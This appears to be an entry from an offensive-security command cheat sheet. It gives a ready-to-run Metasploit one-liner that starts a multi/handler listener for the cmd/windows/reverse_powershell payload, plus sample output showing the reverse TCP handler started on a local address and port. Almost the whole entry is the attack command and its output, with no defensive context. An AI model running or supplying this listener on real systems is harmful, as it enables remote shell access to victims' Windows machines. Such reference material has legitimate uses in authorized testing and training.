---
id: 3302e341-e8ea-4b78-97ec-cbd62d1e3c4b
name: msfconsole Powershell Script Listener
type: command
executor: null
data: msfconsole -q -x "use exploit/multi/handler;set PAYLOAD cmd/windows/reverse_powershell;
  set LHOST $LOCAL_IP; set LPORT $LOCAL_PORT; run;exit -y"
output: 'root@hackers:~# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD cmd/windows/reverse_powershell;
  set LHOST 172.16.162.187; set LPORT 1337; run;exit -y"

  [-] ***

  [-] * WARNING: No database support: No database YAML file

  [-] ***

  PAYLOAD => cmd/windows/reverse_powershell

  LHOST => 172.16.162.187

  LPORT => 1337

  [*] Started reverse TCP handler on 172.16.162.187:1337'
created_at: '2019-09-17T17:39:01.871635+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[Powershell]]'
- '[[SET]]'
---

# msfconsole Powershell Script Listener

```bash
msfconsole -q -x "use exploit/multi/handler;set PAYLOAD cmd/windows/reverse_powershell; set LHOST $LOCAL_IP; set LPORT $LOCAL_PORT; run;exit -y"
```

## Expected Output

```
root@hackers:~# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD cmd/windows/reverse_powershell; set LHOST 172.16.162.187; set LPORT 1337; run;exit -y"
[-] ***
[-] * WARNING: No database support: No database YAML file
[-] ***
PAYLOAD => cmd/windows/reverse_powershell
LHOST => 172.16.162.187
LPORT => 1337
[*] Started reverse TCP handler on 172.16.162.187:1337
```


